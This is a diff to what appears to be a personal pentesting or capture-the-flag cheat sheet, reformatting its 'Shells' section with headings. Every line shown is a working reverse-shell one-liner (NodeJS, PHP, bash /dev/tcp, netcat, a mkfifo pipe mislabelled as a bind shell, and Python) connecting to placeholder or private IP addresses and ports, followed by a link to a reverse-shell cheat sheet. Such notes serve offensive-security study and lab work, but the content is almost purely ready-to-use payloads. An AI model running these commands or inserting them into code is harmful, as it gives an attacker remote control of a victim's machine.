@@ -166,11 +166,23 @@ Port Knocking
 
 Shells
 ------
-      NodeJs: require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f', ()=>{}) 
-      PHP: <?php echo shell_exec('bash -i >& /dev/tcp/192.168.30.31/12345 0>&1'); ?>
+**NodeJs**
+
+      require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f', ()=>{}) 
+**PHP** 
+
+      <?php echo shell_exec('bash -i >& /dev/tcp/192.168.30.31/12345 0>&1'); ?>
+**Bash**
+
       bash -i >& /dev/tcp/IP/PORT 0>&1
+**Netcat**
+
       nc -e /bin/sh IP PORT
+**BindShell**
+
       rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
+**Python**
+
       python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.65.210",1313));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 https://highon.coffee/blog/reverse-shell-cheat-sheet/
